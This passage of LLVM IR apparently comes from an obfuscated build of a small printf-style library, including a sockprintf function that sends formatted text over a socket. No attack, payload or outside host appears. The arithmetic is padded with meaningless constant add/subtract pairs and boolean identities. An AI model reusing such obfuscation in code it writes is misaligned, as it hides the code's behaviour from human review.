  %80 = sub nsw i32 %76, 48
  %81 = load i32, i32* %7, align 4
  %82 = add i32 %81, 1683207343
  %83 = add i32 %82, %79
  %84 = sub i32 %83, 1683207343
  %85 = add nsw i32 %81, %79
  store i32 %84, i32* %7, align 4
  br label %86

; <label>:86:                                     ; preds = %71
  %87 = load i8*, i8** %5, align 8
  %88 = getelementptr inbounds i8, i8* %87, i32 1
  store i8* %88, i8** %5, align 8
  br label %59

; <label>:89:                                     ; preds = %69
  %90 = load i8*, i8** %5, align 8
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 115
  br i1 %93, label %94, label %134

; <label>:94:                                     ; preds = %89
  %95 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %96 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %95, i32 0, i32 0
  %97 = load i32, i32* %96, align 8
  %98 = icmp ule i32 %97, 40
  br i1 %98, label %99, label %108

; <label>:99:                                     ; preds = %94
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %95, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %102 = getelementptr i8, i8* %101, i32 %97
  %103 = bitcast i8* %102 to i32*
  %104 = sub i32 %97, 52430475
  %105 = add i32 %104, 8
  %106 = add i32 %105, 52430475
  %107 = add i32 %97, 8
  store i32 %106, i32* %96, align 8
  br label %113

; <label>:108:                                    ; preds = %94
  %109 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %95, i32 0, i32 2
  %110 = load i8*, i8** %109, align 8
  %111 = bitcast i8* %110 to i32*
  %112 = getelementptr i8, i8* %110, i32 8
  store i8* %112, i8** %109, align 8
  br label %113

; <label>:113:                                    ; preds = %108, %99
  %114 = phi i32* [ %103, %99 ], [ %111, %108 ]
  %115 = load i32, i32* %114, align 4
  %116 = sext i32 %115 to i64
  %117 = inttoptr i64 %116 to i8*
  store i8* %117, i8** %11, align 8
  %118 = load i8**, i8*** %4, align 8
  %119 = load i8*, i8** %11, align 8
  %120 = icmp ne i8* %119, null
  br i1 %120, label %121, label %123

; <label>:121:                                    ; preds = %113
  %122 = load i8*, i8** %11, align 8
  br label %124

; <label>:123:                                    ; preds = %113
  br label %124

; <label>:124:                                    ; preds = %123, %121
  %125 = phi i8* [ %122, %121 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i32 0, i32 0), %123 ]
  %126 = load i32, i32* %7, align 4
  %127 = load i32, i32* %8, align 4
  %128 = call i32 @prints(i8** %118, i8* %125, i32 %126, i32 %127)
  %129 = load i32, i32* %9, align 4
  %130 = sub i32 %129, 1656509585
  %131 = add i32 %130, %128
  %132 = add i32 %131, 1656509585
  %133 = add nsw i32 %129, %128
  store i32 %132, i32* %9, align 4
  br label %331

; <label>:134:                                    ; preds = %89
  %135 = load i8*, i8** %5, align 8
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 100
  br i1 %138, label %139, label %168

; <label>:139:                                    ; preds = %134
  %140 = load i8**, i8*** %4, align 8
  %141 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %142 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %141, i32 0, i32 0
  %143 = load i32, i32* %142, align 8
  %144 = icmp ule i32 %143, 40
  br i1 %144, label %145, label %153

; <label>:145:                                    ; preds = %139
  %146 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %141, i32 0, i32 3
  %147 = load i8*, i8** %146, align 8
  %148 = getelementptr i8, i8* %147, i32 %143
  %149 = bitcast i8* %148 to i32*
  %150 = sub i32 0, 8
  %151 = sub i32 %143, %150
  %152 = add i32 %143, 8
  store i32 %151, i32* %142, align 8
  br label %158

; <label>:153:                                    ; preds = %139
  %154 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %141, i32 0, i32 2
  %155 = load i8*, i8** %154, align 8
  %156 = bitcast i8* %155 to i32*
  %157 = getelementptr i8, i8* %155, i32 8
  store i8* %157, i8** %154, align 8
  br label %158

; <label>:158:                                    ; preds = %153, %145
  %159 = phi i32* [ %149, %145 ], [ %156, %153 ]
  %160 = load i32, i32* %159, align 4
  %161 = load i32, i32* %7, align 4
  %162 = load i32, i32* %8, align 4
  %163 = call i32 @printi(i8** %140, i32 %160, i32 10, i32 1, i32 %161, i32 %162, i32 97)
  %164 = load i32, i32* %9, align 4
  %165 = sub i32 0, %163
  %166 = sub i32 %164, %165
  %167 = add nsw i32 %164, %163
  store i32 %166, i32* %9, align 4
  br label %331

; <label>:168:                                    ; preds = %134
  %169 = load i8*, i8** %5, align 8
  %170 = load i8, i8* %169, align 1
  %171 = zext i8 %170 to i32
  %172 = icmp eq i32 %171, 120
  br i1 %172, label %173, label %206

; <label>:173:                                    ; preds = %168
  %174 = load i8**, i8*** %4, align 8
  %175 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %176 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %175, i32 0, i32 0
  %177 = load i32, i32* %176, align 8
  %178 = icmp ule i32 %177, 40
  br i1 %178, label %179, label %189

; <label>:179:                                    ; preds = %173
  %180 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %175, i32 0, i32 3
  %181 = load i8*, i8** %180, align 8
  %182 = getelementptr i8, i8* %181, i32 %177
  %183 = bitcast i8* %182 to i32*
  %184 = sub i32 0, %177
  %185 = sub i32 0, 8
  %186 = add i32 %184, %185
  %187 = sub i32 0, %186
  %188 = add i32 %177, 8
  store i32 %187, i32* %176, align 8
  br label %194

; <label>:189:                                    ; preds = %173
  %190 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %175, i32 0, i32 2
  %191 = load i8*, i8** %190, align 8
  %192 = bitcast i8* %191 to i32*
  %193 = getelementptr i8, i8* %191, i32 8
  store i8* %193, i8** %190, align 8
  br label %194

; <label>:194:                                    ; preds = %189, %179
  %195 = phi i32* [ %183, %179 ], [ %192, %189 ]
  %196 = load i32, i32* %195, align 4
  %197 = load i32, i32* %7, align 4
  %198 = load i32, i32* %8, align 4
  %199 = call i32 @printi(i8** %174, i32 %196, i32 16, i32 0, i32 %197, i32 %198, i32 97)
  %200 = load i32, i32* %9, align 4
  %201 = sub i32 0, %200
  %202 = sub i32 0, %199
  %203 = add i32 %201, %202
  %204 = sub i32 0, %203
  %205 = add nsw i32 %200, %199
  store i32 %204, i32* %9, align 4
  br label %331

; <label>:206:                                    ; preds = %168
  %207 = load i8*, i8** %5, align 8
  %208 = load i8, i8* %207, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp eq i32 %209, 88
  br i1 %210, label %211, label %242

; <label>:211:                                    ; preds = %206
  %212 = load i8**, i8*** %4, align 8
  %213 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %214 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %213, i32 0, i32 0
  %215 = load i32, i32* %214, align 8
  %216 = icmp ule i32 %215, 40
  br i1 %216, label %217, label %226

; <label>:217:                                    ; preds = %211
  %218 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %213, i32 0, i32 3
  %219 = load i8*, i8** %218, align 8
  %220 = getelementptr i8, i8* %219, i32 %215
  %221 = bitcast i8* %220 to i32*
  %222 = add i32 %215, -571317886
  %223 = add i32 %222, 8
  %224 = sub i32 %223, -571317886
  %225 = add i32 %215, 8
  store i32 %224, i32* %214, align 8
  br label %231

; <label>:226:                                    ; preds = %211
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %213, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %217
  %232 = phi i32* [ %221, %217 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %212, i32 %233, i32 16, i32 0, i32 %234, i32 %235, i32 65)
  %237 = load i32, i32* %9, align 4
  %238 = add i32 %237, 1511896001
  %239 = add i32 %238, %236
  %240 = sub i32 %239, 1511896001
  %241 = add nsw i32 %237, %236
  store i32 %240, i32* %9, align 4
  br label %331

; <label>:242:                                    ; preds = %206
  %243 = load i8*, i8** %5, align 8
  %244 = load i8, i8* %243, align 1
  %245 = zext i8 %244 to i32
  %246 = icmp eq i32 %245, 117
  br i1 %246, label %247, label %277

; <label>:247:                                    ; preds = %242
  %248 = load i8**, i8*** %4, align 8
  %249 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %249, i32 0, i32 0
  %251 = load i32, i32* %250, align 8
  %252 = icmp ule i32 %251, 40
  br i1 %252, label %253, label %261

; <label>:253:                                    ; preds = %247
  %254 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %249, i32 0, i32 3
  %255 = load i8*, i8** %254, align 8
  %256 = getelementptr i8, i8* %255, i32 %251
  %257 = bitcast i8* %256 to i32*
  %258 = sub i32 0, 8
  %259 = sub i32 %251, %258
  %260 = add i32 %251, 8
  store i32 %259, i32* %250, align 8
  br label %266

; <label>:261:                                    ; preds = %247
  %262 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %249, i32 0, i32 2
  %263 = load i8*, i8** %262, align 8
  %264 = bitcast i8* %263 to i32*
  %265 = getelementptr i8, i8* %263, i32 8
  store i8* %265, i8** %262, align 8
  br label %266

; <label>:266:                                    ; preds = %261, %253
  %267 = phi i32* [ %257, %253 ], [ %264, %261 ]
  %268 = load i32, i32* %267, align 4
  %269 = load i32, i32* %7, align 4
  %270 = load i32, i32* %8, align 4
  %271 = call i32 @printi(i8** %248, i32 %268, i32 10, i32 0, i32 %269, i32 %270, i32 97)
  %272 = load i32, i32* %9, align 4
  %273 = add i32 %272, -1674887345
  %274 = add i32 %273, %271
  %275 = sub i32 %274, -1674887345
  %276 = add nsw i32 %272, %271
  store i32 %275, i32* %9, align 4
  br label %331

; <label>:277:                                    ; preds = %242
  %278 = load i8*, i8** %5, align 8
  %279 = load i8, i8* %278, align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 99
  br i1 %281, label %282, label %318

; <label>:282:                                    ; preds = %277
  %283 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %284 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %283, i32 0, i32 0
  %285 = load i32, i32* %284, align 8
  %286 = icmp ule i32 %285, 40
  br i1 %286, label %287, label %296

; <label>:287:                                    ; preds = %282
  %288 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %283, i32 0, i32 3
  %289 = load i8*, i8** %288, align 8
  %290 = getelementptr i8, i8* %289, i32 %285
  %291 = bitcast i8* %290 to i32*
  %292 = sub i32 %285, -1618743054
  %293 = add i32 %292, 8
  %294 = add i32 %293, -1618743054
  %295 = add i32 %285, 8
  store i32 %294, i32* %284, align 8
  br label %301

; <label>:296:                                    ; preds = %282
  %297 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %283, i32 0, i32 2
  %298 = load i8*, i8** %297, align 8
  %299 = bitcast i8* %298 to i32*
  %300 = getelementptr i8, i8* %298, i32 8
  store i8* %300, i8** %297, align 8
  br label %301

; <label>:301:                                    ; preds = %296, %287
  %302 = phi i32* [ %291, %287 ], [ %299, %296 ]
  %303 = load i32, i32* %302, align 4
  %304 = trunc i32 %303 to i8
  %305 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %304, i8* %305, align 1
  %306 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %306, align 1
  %307 = load i8**, i8*** %4, align 8
  %308 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %309 = load i32, i32* %7, align 4
  %310 = load i32, i32* %8, align 4
  %311 = call i32 @prints(i8** %307, i8* %308, i32 %309, i32 %310)
  %312 = load i32, i32* %9, align 4
  %313 = sub i32 0, %312
  %314 = sub i32 0, %311
  %315 = add i32 %313, %314
  %316 = sub i32 0, %315
  %317 = add nsw i32 %312, %311
  store i32 %316, i32* %9, align 4
  br label %331

; <label>:318:                                    ; preds = %277
  br label %330

; <label>:319:                                    ; preds = %17
  br label %320

; <label>:320:                                    ; preds = %319, %35
  %321 = load i8**, i8*** %4, align 8
  %322 = load i8*, i8** %5, align 8
  %323 = load i8, i8* %322, align 1
  %324 = zext i8 %323 to i32
  call void @printchar(i8** %321, i32 %324)
  %325 = load i32, i32* %9, align 4
  %326 = sub i32 %325, 1012612716
  %327 = add i32 %326, 1
  %328 = add i32 %327, 1012612716
  %329 = add nsw i32 %325, 1
  store i32 %328, i32* %9, align 4
  br label %330

; <label>:330:                                    ; preds = %320, %318
  br label %331

; <label>:331:                                    ; preds = %330, %301, %266, %231, %194, %158, %124
  %332 = load i8*, i8** %5, align 8
  %333 = getelementptr inbounds i8, i8* %332, i32 1
  store i8* %333, i8** %5, align 8
  br label %12

; <label>:334:                                    ; preds = %29, %12
  %335 = load i8**, i8*** %4, align 8
  %336 = icmp ne i8** %335, null
  br i1 %336, label %337, label %340

; <label>:337:                                    ; preds = %334
  %338 = load i8**, i8*** %4, align 8
  %339 = load i8*, i8** %338, align 8
  store i8 0, i8* %339, align 1
  br label %340

; <label>:340:                                    ; preds = %337, %334
  %341 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %342 = bitcast %struct.__va_list_tag* %341 to i8*
  call void @llvm.va_end(i8* %342)
  %343 = load i32, i32* %9, align 4
  ret i32 %343
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %51

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %28, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %31

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = sub i32 0, %22
  %24 = sub i32 0, 1
  %25 = add i32 %23, %24
  %26 = sub i32 0, %25
  %27 = add nsw i32 %22, 1
  store i32 %26, i32* %11, align 4
  br label %28

; <label>:28:                                     ; preds = %21
  %29 = load i8*, i8** %12, align 8
  %30 = getelementptr inbounds i8, i8* %29, i32 1
  store i8* %30, i8** %12, align 8
  br label %17

; <label>:31:                                     ; preds = %17
  %32 = load i32, i32* %11, align 4
  %33 = load i32, i32* %7, align 4
  %34 = icmp sge i32 %32, %33
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %31
  store i32 0, i32* %7, align 4
  br label %42

; <label>:36:                                     ; preds = %31
  %37 = load i32, i32* %11, align 4
  %38 = load i32, i32* %7, align 4
  %39 = sub i32 0, %37
  %40 = add i32 %38, %39
  %41 = sub nsw i32 %38, %37
  store i32 %40, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %36, %35
  %43 = load i32, i32* %8, align 4
  %44 = xor i32 2, -1
  %45 = xor i32 %43, %44
  %46 = and i32 %45, %43
  %47 = and i32 %43, 2
  %48 = icmp ne i32 %46, 0
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %42
  store i32 48, i32* %10, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %42
  br label %51

; <label>:51:                                     ; preds = %50, %4
  %52 = load i32, i32* %8, align 4
  %53 = xor i32 %52, -1
  %54 = xor i32 1, -1
  %55 = xor i32 -1666465410, -1
  %56 = or i32 %53, %54
  %57 = or i32 -1666465410, %55
  %58 = xor i32 %56, -1
  %59 = and i32 %58, %57
  %60 = and i32 %52, 1
  %61 = icmp ne i32 %59, 0
  br i1 %61, label %81, label %62

; <label>:62:                                     ; preds = %51
  br label %63

; <label>:63:                                     ; preds = %73, %62
  %64 = load i32, i32* %7, align 4
  %65 = icmp sgt i32 %64, 0
  br i1 %65, label %66, label %80

; <label>:66:                                     ; preds = %63
  %67 = load i8**, i8*** %5, align 8
  %68 = load i32, i32* %10, align 4
  call void @printchar(i8** %67, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = sub i32 0, 1
  %71 = sub i32 %69, %70
  %72 = add nsw i32 %69, 1
  store i32 %71, i32* %9, align 4
  br label %73

; <label>:73:                                     ; preds = %66
  %74 = load i32, i32* %7, align 4
  %75 = sub i32 0, %74
  %76 = sub i32 0, -1
  %77 = add i32 %75, %76
  %78 = sub i32 0, %77
  %79 = add nsw i32 %74, -1
  store i32 %78, i32* %7, align 4
  br label %63

; <label>:80:                                     ; preds = %63
  br label %81

; <label>:81:                                     ; preds = %80, %51
  br label %82

; <label>:82:                                     ; preds = %95, %81
  %83 = load i8*, i8** %6, align 8
  %84 = load i8, i8* %83, align 1
  %85 = icmp ne i8 %84, 0
  br i1 %85, label %86, label %98

; <label>:86:                                     ; preds = %82
  %87 = load i8**, i8*** %5, align 8
  %88 = load i8*, i8** %6, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  call void @printchar(i8** %87, i32 %90)
  %91 = load i32, i32* %9, align 4
  %92 = sub i32 0, 1
  %93 = sub i32 %91, %92
  %94 = add nsw i32 %91, 1
  store i32 %93, i32* %9, align 4
  br label %95

; <label>:95:                                     ; preds = %86
  %96 = load i8*, i8** %6, align 8
  %97 = getelementptr inbounds i8, i8* %96, i32 1
  store i8* %97, i8** %6, align 8
  br label %82

; <label>:98:                                     ; preds = %82
  br label %99

; <label>:99:                                     ; preds = %110, %98
  %100 = load i32, i32* %7, align 4
  %101 = icmp sgt i32 %100, 0
  br i1 %101, label %102, label %116

; <label>:102:                                    ; preds = %99
  %103 = load i8**, i8*** %5, align 8
  %104 = load i32, i32* %10, align 4
  call void @printchar(i8** %103, i32 %104)
  %105 = load i32, i32* %9, align 4
  %106 = sub i32 %105, 1924907347
  %107 = add i32 %106, 1
  %108 = add i32 %107, 1924907347
  %109 = add nsw i32 %105, 1
  store i32 %108, i32* %9, align 4
  br label %110

; <label>:110:                                    ; preds = %102
  %111 = load i32, i32* %7, align 4
  %112 = add i32 %111, 1032288731
  %113 = add i32 %112, -1
  %114 = sub i32 %113, 1032288731
  %115 = add nsw i32 %111, -1
  store i32 %114, i32* %7, align 4
  br label %99

; <label>:116:                                    ; preds = %99
  %117 = load i32, i32* %9, align 4
  ret i32 %117
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %133

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %48

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %48

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %48

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, -1624100445
  %45 = sub i32 %44, %43
  %46 = add i32 %45, -1624100445
  %47 = sub nsw i32 0, %43
  store i32 %46, i32* %21, align 4
  br label %48

; <label>:48:                                     ; preds = %42, %39, %36, %33
  %49 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %50 = getelementptr inbounds i8, i8* %49, i64 12
  %51 = getelementptr inbounds i8, i8* %50, i64 -1
  store i8* %51, i8** %17, align 8
  %52 = load i8*, i8** %17, align 8
  store i8 0, i8* %52, align 1
  br label %53

; <label>:53:                                     ; preds = %77, %48
  %54 = load i32, i32* %21, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %89

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* %21, align 4
  %58 = load i32, i32* %11, align 4
  %59 = urem i32 %57, %58
  store i32 %59, i32* %18, align 4
  %60 = load i32, i32* %18, align 4
  %61 = icmp sge i32 %60, 10
  br i1 %61, label %62, label %77

; <label>:62:                                     ; preds = %56
  %63 = load i32, i32* %15, align 4
  %64 = sub i32 %63, 1938031968
  %65 = sub i32 %64, 48
  %66 = add i32 %65, 1938031968
  %67 = sub nsw i32 %63, 48
  %68 = sub i32 %66, -695792073
  %69 = sub i32 %68, 10
  %70 = add i32 %69, -695792073
  %71 = sub nsw i32 %66, 10
  %72 = load i32, i32* %18, align 4
  %73 = add i32 %72, -74292200
  %74 = add i32 %73, %70
  %75 = sub i32 %74, -74292200
  %76 = add nsw i32 %72, %70
  store i32 %75, i32* %18, align 4
  br label %77

; <label>:77:                                     ; preds = %62, %56
  %78 = load i32, i32* %18, align 4
  %79 = sub i32 %78, -101751862
  %80 = add i32 %79, 48
  %81 = add i32 %80, -101751862
  %82 = add nsw i32 %78, 48
  %83 = trunc i32 %81 to i8
  %84 = load i8*, i8** %17, align 8
  %85 = getelementptr inbounds i8, i8* %84, i32 -1
  store i8* %85, i8** %17, align 8
  store i8 %83, i8* %85, align 1
  %86 = load i32, i32* %11, align 4
  %87 = load i32, i32* %21, align 4
  %88 = udiv i32 %87, %86
  store i32 %88, i32* %21, align 4
  br label %53

; <label>:89:                                     ; preds = %53
  %90 = load i32, i32* %19, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %122

; <label>:92:                                     ; preds = %89
  %93 = load i32, i32* %13, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %118

; <label>:95:                                     ; preds = %92
  %96 = load i32, i32* %14, align 4
  %97 = xor i32 %96, -1
  %98 = xor i32 2, -1
  %99 = xor i32 774459521, -1
  %100 = or i32 %97, %98
  %101 = or i32 774459521, %99
  %102 = xor i32 %100, -1
  %103 = and i32 %102, %101
  %104 = and i32 %96, 2
  %105 = icmp ne i32 %103, 0
  br i1 %105, label %106, label %118

; <label>:106:                                    ; preds = %95
  %107 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %107, i32 45)
  %108 = load i32, i32* %20, align 4
  %109 = sub i32 %108, -567848566
  %110 = add i32 %109, 1
  %111 = add i32 %110, -567848566
  %112 = add nsw i32 %108, 1
  store i32 %111, i32* %20, align 4
  %113 = load i32, i32* %13, align 4
  %114 = sub i32 %113, 1241285967
  %115 = add i32 %114, -1
  %116 = add i32 %115, 1241285967
  %117 = add nsw i32 %113, -1
  store i32 %116, i32* %13, align 4
  br label %121

; <label>:118:                                    ; preds = %95, %92
  %119 = load i8*, i8** %17, align 8
  %120 = getelementptr inbounds i8, i8* %119, i32 -1
  store i8* %120, i8** %17, align 8
  store i8 45, i8* %120, align 1
  br label %121

; <label>:121:                                    ; preds = %118, %106
  br label %122

; <label>:122:                                    ; preds = %121, %89
  %123 = load i32, i32* %20, align 4
  %124 = load i8**, i8*** %9, align 8
  %125 = load i8*, i8** %17, align 8
  %126 = load i32, i32* %13, align 4
  %127 = load i32, i32* %14, align 4
  %128 = call i32 @prints(i8** %124, i8* %125, i32 %126, i32 %127)
  %129 = add i32 %123, 2055078512
  %130 = add i32 %129, %128
  %131 = sub i32 %130, 2055078512
  %132 = add nsw i32 %123, %128
  store i32 %131, i32* %8, align 4
  br label %133

; <label>:133:                                    ; preds = %122, %25
  %134 = load i32, i32* %8, align 4
  ret i32 %134
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

